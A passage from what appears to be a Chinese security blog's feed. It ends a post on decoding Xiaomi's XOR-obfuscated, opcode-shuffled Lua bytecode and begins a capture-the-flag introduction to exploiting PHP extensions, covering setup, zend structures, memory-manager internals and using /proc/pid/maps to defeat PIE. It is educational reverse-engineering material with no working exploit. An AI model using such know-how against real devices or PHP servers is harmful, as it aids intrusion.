class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_10CB8</span><span class="params">(_DWORD *a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r5</span></span><br><span class="line">  _BYTE *i; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v6; <span class="comment">// [sp+0h] [bp-18h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [sp+4h] [bp-14h]</span></span><br><span class="line"></span><br><span class="line">  v6 = (<span class="type">unsigned</span> <span class="type">int</span>)a1;</span><br><span class="line">  v7 = a2;</span><br><span class="line">  v7 = *(_DWORD *)off_2FFE8;</span><br><span class="line">  ((<span class="type">void</span> (__fastcall *)(_DWORD *, <span class="type">unsigned</span> <span class="type">int</span> *, <span class="type">int</span>, <span class="type">int</span>))sub_10AC0)(a1, &amp;v6, <span class="number">1</span>, <span class="number">4</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !v6 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v4 = sub_137C8(*a1, a1[<span class="number">2</span>]);</span><br><span class="line">  sub_10A90((<span class="type">int</span>)a1);</span><br><span class="line">  <span class="keyword">for</span> ( i = (_BYTE *)v4; v6 &gt; (<span class="type">unsigned</span> <span class="type">int</span>)&amp;i[-v4]; ++i )</span><br><span class="line">    *i ^= <span class="number">13</span> * v6 + <span class="number">55</span>;</span><br><span class="line">  <span class="keyword">return</span> luaS_newlstr(*a1, v4, v6 - <span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解密部分是这一块</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = (_BYTE *)v4; v6 &gt; (<span class="type">unsigned</span> <span class="type">int</span>)&amp;i[-v4]; ++i )</span><br><span class="line">  *i ^= <span class="number">13</span> * v6 + <span class="number">55</span>;</span><br></pre></td></tr></table></figure><p>v6通过上下文可以知道就是字符串的长度,那么对应的处理也就知晓</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">StrAdapter</span>(<span class="title class_ inherited__">Adapter</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, key, subcon</span>):</span><br><span class="line">        <span class="keyword">assert</span> key &lt; <span class="number">0xff</span></span><br><span class="line">        self.key = key</span><br><span class="line">        <span class="built_in">super</span>().__init__(subcon)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_decode</span>(<span class="params">self, obj, context, path</span>):</span><br><span class="line">        l = []</span><br><span class="line">        key = evaluate(self.key, context)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> obj:</span><br><span class="line">            l.append(i ^ key)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(l)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_encode</span>(<span class="params">self, obj, context, path</span>):</span><br><span class="line">        l = []</span><br><span class="line">        key = evaluate(self.key, context)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> obj:</span><br><span class="line">            l.append(i ^ key)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>(l)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">String = Struct(</span><br><span class="line">    <span class="string">&quot;size&quot;</span> / LazyBound(<span class="keyword">lambda</span>: LuaSize_t),</span><br><span class="line">    <span class="string">&quot;str&quot;</span> / StrAdapter((this.size * <span class="number">13</span> + <span class="number">55</span>) &amp; <span class="number">0xff</span>, Bytes(this.size))</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>原版的 <code>String</code> 结构非常直接，没有任何自定义的处理或操作,就是读取字符串长度 <code>size</code>,读取对应长度的字节流 <code>str</code>。</p><p>处理xiaomi的顺序,则是读取字符串长度<code>size</code>,然后通过<code>size</code>计算出密钥,然后读取<code>size</code>长度的字节流,最后对字节流按密钥处理</p><h3 id="handle-Opcode"><a href="#handle-Opcode" class="headerlink" title="handle_Opcode"></a>handle_Opcode</h3><p>最后xiaomi还对opcode顺序进行了打乱</p><p>此外xiaomi还打乱了Opcode的值与操作对应关系,一般就是通过与自己编译出来的作比较,判断出映射关系,建议以官方版本为对照,逐个去改版中找对应官方顺序的操作</p><p>找出对应的映射</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OpCodeMap = [<span class="number">20</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">24</span>, <span class="number">19</span>, <span class="number">24</span>, <span class="number">1</span>, <span class="number">34</span>, <span class="number">30</span>, <span class="number">26</span>, <span class="number">33</span>, <span class="number">32</span>, <span class="number">13</span>, <span class="number">29</span>, <span class="number">15</span>, <span class="number">11</span>, <span class="number">28</span>, <span class="number">9</span>, <span class="number">4</span>, <span class="number">23</span>, <span class="number">23</span>, <span class="number">21</span>, <span class="number">25</span>, <span class="number">25</span>, <span class="number">2</span>, <span class="number">16</span>, <span class="number">31</span>, <span class="number">6</span>, <span class="number">10</span>, <span class="number">35</span>, <span class="number">37</span>, <span class="number">22</span>, <span class="number">18</span>, <span class="number">17</span>, <span class="number">14</span>, <span class="number">27</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">5</span>, <span class="number">8</span>, <span class="number">7</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure><p>然后根据OpCodeMap使用魔改后的opcode找到其实现的标准功能,并将其opcode转化为标准形式</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">InstructionsAdapter</span>(<span class="title class_ inherited__">Adapter</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_encode</span>(<span class="params">self, obj, context, path</span>):</span><br><span class="line">        obj.opcode = OpCode.parse(integer2bits(OpCodeMap.index(<span class="built_in">int</span>(obj.opcode)), <span class="number">6</span>))</span><br><span class="line">        <span class="keyword">return</span> obj</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_decode</span>(<span class="params">self, obj, context, path</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">int</span>(obj.opcode) == <span class="number">2</span>:</span><br><span class="line">            logging.warning(<span class="string">&quot;find mi opcode&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> obj.C == <span class="number">0</span>:</span><br><span class="line">                op = <span class="number">29</span></span><br><span class="line">            <span class="keyword">elif</span> obj.C == <span class="number">1</span>:</span><br><span class="line">                op = <span class="number">0</span></span><br><span class="line">            <span class="keyword">elif</span> obj.C == <span class="number">2</span>:</span><br><span class="line">                op = <span class="number">32</span></span><br><span class="line">            <span class="keyword">elif</span> obj.C == <span class="number">3</span>:</span><br><span class="line">                op = <span class="number">4</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                LuaDecodeException(<span class="string">&quot;opcode error&quot;</span>)</span><br><span class="line">            obj.opcode = OpCode.parse(integer2bits(OpCodeMap[op], <span class="number">6</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            obj.opcode = OpCode.parse(integer2bits(OpCodeMap[<span class="built_in">int</span>(obj.opcode)], <span class="number">6</span>))</span><br><span class="line">        <span class="keyword">return</span> obj</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">lualualualua</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="iot" scheme="https://ixout.github.io/tags/iot/"/>
    
  </entry>
  
  <entry>
    <title>phppwn初识</title>
    <link href="https://ixout.github.io/posts/5022/"/>
    <id>https://ixout.github.io/posts/5022/</id>
    <published>2024-05-02T08:23:40.000Z</published>
    <updated>2024-11-20T14:11:46.250Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>一般phppwn都是给一个拓展so文件,只需要启用这个拓展便可以直接进行内部函数调用</p><p>但比较不好的一点是php版本需要与编译so文件的版本相同</p><p>而在ubuntu20下默认安装的php版本应该是php7.4</p><p>所以需要自己另外添加一个php仓库源</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:ondrej/php</span><br></pre></td></tr></table></figure><p>然后更新一下</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br></pre></td></tr></table></figure><p>之后安装对应版本即可</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install php8.3</span><br></pre></td></tr></table></figure><p>将题目给出的so文件装载于对应目录</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php -i | grep -i extension_dir</span><br><span class="line">extension_dir =&gt; /usr/lib/php/20230831 =&gt; /usr/lib/php/20230831</span><br><span class="line">sudo <span class="built_in">cp</span> vuln.so /usr/lib/php/20230831/vuln.so</span><br></pre></td></tr></table></figure><p>为了避免频繁修改php.ini,如果题目有给出php.ini的话可以直接使用参数</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -c php.ini index.php</span><br></pre></td></tr></table></figure><p>如果没有的话则需要找到php的默认php.ini</p><p>添加一句</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">extension</span> = vuln.so</span><br></pre></td></tr></table></figure><h2 id="运行模式"><a href="#运行模式" class="headerlink" title="运行模式"></a>运行模式</h2><p>CLI运行模式:</p><p>通常我们在开发PHP扩展时，多是用命令行终端来直接使用php解释器直接解释执行.php文件，在.php文件中我们写入需要调用的扩展函数，该扩展函数被编译在.so的扩展模块中，这种运行模式我一般称为<code>CLI模式</code>，该模式对应的php声明周期一般为单进程SAPI生命周期</p><p>CGI运行模式</p><p>其中对于大部分网站应用服务器来说，大部分时候PHP解释器运行的模式为CGI模式——单进程SAPI生命周期，此模式运行特点为请求到达时，<u>为每个请求fork一个进程</u>，一个进程只对一个请求做出响应，请求结束后，进程也就结束了。其中fork的进程，和原进程的内存布局一般来说是一模一样的，所以这里如果能拿到<code>/proc/&#123;pid&#125;/maps</code>文件，则可以拿到该进程的内存布局，可以拿到所有基地址，从而无视PIE保护。</p><h2 id="zend基本数据类型"><a href="#zend基本数据类型" class="headerlink" title="zend基本数据类型"></a>zend基本数据类型</h2><p>由于zend引擎的原因，ida反编译的伪代码很难理解,所以先学习一下zend中的基本数据类型</p><p>当我们查看phppwn的拓展时,会发现其函数普遍只有两个参数,实际上并不是这样,第一个参数是一个<code>zend_execute_data</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_execute_data</span> &#123;</span></span><br><span class="line"><span class="type">const</span> zend_op       *opline;           <span class="comment">/* executed opline                */</span></span><br><span class="line">zend_execute_data   *call;             <span class="comment">/* current call                   */</span></span><br><span class="line">zval                *return_value;</span><br><span class="line">zend_function       *func;             <span class="comment">/* executed function              */</span></span><br><span class="line">zval                 This;             <span class="comment">/* this + call_info + num_args    */</span></span><br><span class="line">zend_execute_data   *prev_execute_data;</span><br><span class="line">zend_array          *symbol_table;</span><br><span class="line"><span class="type">void</span>               **run_time_cache;   <span class="comment">/* cache op_array-&gt;run_time_cache */</span></span><br><span class="line">zend_array          *extra_named_params;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>zval就是<code>typedef struct _zval_struct zval;</code>,</p><p>有两个最基本的数据类型也就是 <code>_zend_value</code> 和 <code>_zval_struct</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">union</span> _<span class="title">zend_value</span> &#123;</span></span><br><span class="line">zend_long         lval;<span class="comment">/* long value */</span></span><br><span class="line"><span class="type">double</span>            dval;<span class="comment">/* double value */</span></span><br><span class="line">zend_refcounted  *counted;</span><br><span class="line">zend_string      *str;</span><br><span class="line">zend_array       *arr;</span><br><span class="line">zend_object      *obj;</span><br><span class="line">zend_resource    *res;</span><br><span class="line">zend_reference   *ref;</span><br><span class="line">zend_ast_ref     *ast;</span><br><span class="line">zval             *zv;</span><br><span class="line"><span class="type">void</span>             *ptr;</span><br><span class="line">zend_class_entry *ce;</span><br><span class="line">zend_function    *func;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line"><span class="type">uint32_t</span> w1;</span><br><span class="line"><span class="type">uint32_t</span> w2;</span><br><span class="line">&#125; ww;</span><br><span class="line">&#125; zend_value;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zval_struct</span> &#123;</span></span><br><span class="line">zend_value        value;<span class="comment">/* value */</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">uint32_t</span> type_info;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">ZEND_ENDIAN_LOHI_3(</span><br><span class="line">zend_uchar    type,<span class="comment">/* active type */</span></span><br><span class="line">zend_uchar    type_flags,</span><br><span class="line"><span class="keyword">union</span> &#123;</span><br><span class="line"><span class="type">uint16_t</span>  extra;        <span class="comment">/* not further specified */</span></span><br><span class="line">&#125; u)</span><br><span class="line">&#125; v;</span><br><span class="line">&#125; u1;</span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line"><span class="type">uint32_t</span>     next;                 <span class="comment">/* hash collision chain */</span></span><br><span class="line"><span class="type">uint32_t</span>     cache_slot;           <span class="comment">/* cache slot (for RECV_INIT) */</span></span><br><span class="line"><span class="type">uint32_t</span>     opline_num;           <span class="comment">/* opline number (for FAST_CALL) */</span></span><br><span class="line"><span class="type">uint32_t</span>     lineno;               <span class="comment">/* line number (for ast nodes) */</span></span><br><span class="line"><span class="type">uint32_t</span>     num_args;             <span class="comment">/* arguments number for EX(This) */</span></span><br><span class="line"><span class="type">uint32_t</span>     fe_pos;               <span class="comment">/* foreach position */</span></span><br><span class="line"><span class="type">uint32_t</span>     fe_iter_idx;          <span class="comment">/* foreach iterator index */</span></span><br><span class="line"><span class="type">uint32_t</span>     property_guard;       <span class="comment">/* single property guard */</span></span><br><span class="line"><span class="type">uint32_t</span>     constant_flags;       <span class="comment">/* constant flags */</span></span><br><span class="line"><span class="type">uint32_t</span>     extra;                <span class="comment">/* not further specified */</span></span><br><span class="line">&#125; u2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>zend_uchar type: 以下为外部使用的变量类型</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IS_UNDEF                    0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_NULL                        1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_FALSE                    2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_TRUE                        3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_LONG                        4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_DOUBLE                    5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_STRING                    6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_ARRAY                    7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_OBJECT                    8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_RESOURCE                    9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IS_REFERENCE                10</span></span><br></pre></td></tr></table></figure><p>几个常见数据类型的结构</p><p>STRING</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_string</span> &#123;</span></span><br><span class="line">zend_refcounted_h gc;</span><br><span class="line">zend_ulong        h;                <span class="comment">/* hash value */</span></span><br><span class="line"><span class="type">size_t</span>            len;<span class="comment">//不包含\0</span></span><br><span class="line"><span class="type">char</span>              val[<span class="number">1</span>];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="ida反编译"><a href="#ida反编译" class="headerlink" title="ida反编译"></a>ida反编译</h3><p>从ida的反编译结果来看,自定义的拓展函数的开头前几句中一定会有这一句</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v4 = *(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">44</span>);</span><br></pre></td></tr></table></figure><p>这一步其实是在获取参数个数</p><p>之后会有一个类似这样的函数解析参数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zend_parse_parameters(v3, &amp;unk_2000, &amp;v15, &amp;v14)</span><br></pre></td></tr></table></figure><p>再然后从<code>a1+80</code>开始是第一个参数,每一个参数长度为<code>0x10</code></p><p>所有的参数都有序排布在这里</p><h2 id="php内存管理器"><a href="#php内存管理器" class="headerlink" title="php内存管理器"></a>php内存管理器</h2><p><a href="https://learnku.com/docs/php-internals/php7/zend-memory-manager/7229">5.1. Zend 内存管理器 | 内存管理 |《PHP 内核与原生扩展开发 php7》| PHP 技术论坛 (learnku.com)</a></p><p><a href="https://zhuanlan.zhihu.com/p/343695712">深入理解PHP的内存管理 - 知乎 (zhihu.com)</a></p><p><a href="https://github.com/php/php-src/blob/master/Zend/zend_alloc.c">php-src/Zend/zend_alloc.c at master · php/php-src (github.com)</a></p><p><a href="https://www.bookstack.cn/read/php-internals/55.md">https://www.bookstack.cn/read/php-internals/55.md</a></p><p>与大多数运行时相同,php自己实现了一套动态内存管理机制</p><p>php的内存管理器被称为Zend内存管理器,这个内存管理器说实话有点像内核slab分配器与glibc-ptmalloc2分配器的结合</p><p>PHP的内存管理可以被看作是分层（hierarchical）的。它分为三层：存储层（storage）、堆层（heap）和接口层（emalloc/efree）。</p><h3 id="存储层"><a href="#存储层" class="headerlink" title="存储层"></a><strong>存储层</strong></h3><p>存储层通过 malloc()、mmap() 等函数向系统真正的申请内存，并通过 free() 函数释放所申请的内存。存储层通常申请的内存块都比较大，这里申请的内存大并不是指storage层结构所需要的内存大，只是堆层通过调用存储层的分配方法时，其以大块大块的方式申请的内存，存储层的作用是将内存分配的方式对堆层透明化。</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-05-06_160205.png" alt=""></p><p>PHP在存储层共有4种内存分配方案: malloc，win32，mmap_anon，mmap_zero，默认使用malloc分配内存，如果设置了ZEND_WIN32宏，则为windows版本，调用HeapAlloc分配内存，剩下两种内存方案为匿名内存映射，并且PHP的内存方案可以通过设置环境变量来修改。</p><h3 id="接口层"><a href="#接口层" class="headerlink" title="接口层"></a><strong>接口层</strong></h3><p>接口层是一些宏定义，如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Standard wrapper macros */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> emalloc(size)                       _emalloc((size) ZEND_FILE_LINE_CC ZEND_FILE_LINE_EMPTY_CC)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> safe_emalloc(nmemb, size, offset)   _safe_emalloc((nmemb), (size), (offset) ZEND_FILE_LINE_CC ZEND_FILE_LINE_EMPTY_CC)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> efree(ptr)                          _efree((ptr) ZEND_FILE_LINE_CC ZEND_FILE_LINE_EMPTY_CC)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ecalloc(nmemb, size)                _ecalloc((nmemb), (size) ZEND_FILE_LINE_CC ZEND_FILE_LINE_EMPTY_CC)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> erealloc(ptr, size)                 _erealloc((ptr), (size), 0 ZEND_FILE_LINE_CC ZEND_FILE_LINE_EMPTY_CC)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> safe_erealloc(ptr, nmemb, size, offset) _safe_erealloc((ptr), (nmemb), (size), (offset) ZEND_FILE_LINE_CC ZEND_FILE_LINE_EMPTY_CC)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> erealloc_recoverable(ptr, size)     _erealloc((ptr), (size), 1 ZEND_FILE_LINE_CC ZEND_FILE_LINE_EMPTY_CC)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> estrdup(s)                          _estrdup((s) ZEND_FILE_LINE_CC ZEND_FILE_LINE_EMPTY_CC)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> estrndup(s, length)                 _estrndup((s), (length) ZEND_FILE_LINE_CC ZEND_FILE_LINE_EMPTY_CC)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> zend_mem_block_size(ptr)            _zend_mem_block_size((ptr) TSRMLS_CC ZEND_FILE_LINE_CC ZEND_FILE_LINE_EMPTY_CC)</span></span><br></pre></td></tr></table></figure><p>这里为什么没有直接调用函数？因为这些宏相当于一个接口层或中间层，定义了一个高层次的接口，使得调用更加容易它隔离了外部调用和PHP内存管理的内部实现，实现了一种松耦合关系。</p><h3 id="堆层"><a href="#堆层" class="headerlink" title="堆层"></a><strong>堆层</strong></h3><p>在接口层下面是PHP内存管理的核心实现，我们称之为heap层。这个层控制整个PHP内存管理的过程</p><p>这个层分为旧版和新版,旧版基本已经被淘汰了</p><h4 id="旧"><a href="#旧" class="headerlink" title="旧"></a>旧</h4><p>首先我们看这个层的重要结构：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* mm block type */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_block_info</span> &#123;</span></span><br><span class="line">    <span class="type">size_t</span> _size;   <span class="comment">/* block的大小*/</span></span><br><span class="line">    <span class="type">size_t</span> _prev;   <span class="comment">/* 计算前一个块有用到*/</span></span><br><span class="line">&#125; zend_mm_block_info;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_block</span> &#123;</span></span><br><span class="line">    zend_mm_block_info info;</span><br><span class="line">&#125; zend_mm_block;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_small_free_block</span> &#123;</span>  <span class="comment">/* 双向链表 */</span></span><br><span class="line">    zend_mm_block_info info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_free_block</span> *<span class="title">prev_free_block</span>;</span>    <span class="comment">/* 前一个块 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_free_block</span> *<span class="title">next_free_block</span>;</span>    <span class="comment">/* 后一个块 */</span></span><br><span class="line">&#125; zend_mm_small_free_block; <span class="comment">/* 小的空闲块*/</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_free_block</span> &#123;</span>    <span class="comment">/* 双向链表 + 树结构 */</span></span><br><span class="line">    zend_mm_block_info info;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_free_block</span> *<span class="title">prev_free_block</span>;</span>    <span class="comment">/* 前一个块 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_free_block</span> *<span class="title">next_free_block</span>;</span>    <span class="comment">/* 后一个块 */</span></span><br><span class="line"> </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_free_block</span> **<span class="title">parent</span>;</span>    <span class="comment">/* 父结点 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_free_block</span> *<span class="title">child</span>[2];</span>   <span class="comment">/* 两个子结点*/</span></span><br><span class="line">&#125; zend_mm_free_block;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_mm_heap</span> &#123;</span></span><br><span class="line">    <span class="type">int</span>                 use_zend_alloc; <span class="comment">/* 是否使用zend内存管理器 */</span></span><br><span class="line">    <span class="type">void</span>               *(*_malloc)(<span class="type">size_t</span>); <span class="comment">/* 内存分配函数*/</span></span><br><span class="line">    <span class="type">void</span>                (*_free)(<span class="type">void</span>*);    <span class="comment">/* 内存释放函数*/</span></span><br><span class="line">    <span class="type">void</span>               *(*_realloc)(<span class="type">void</span>*, <span class="type">size_t</span>);</span><br><span class="line">    <span class="type">size_t</span>              free_bitmap;    <span class="comment">/* 小块空闲内存标识 */</span></span><br><span class="line">    <span class="type">size_t</span>              large_free_bitmap;  <span class="comment">/* 大块空闲内存标识*/</span></span><br><span class="line">    <span class="type">size_t</span>              block_size;     <span class="comment">/* 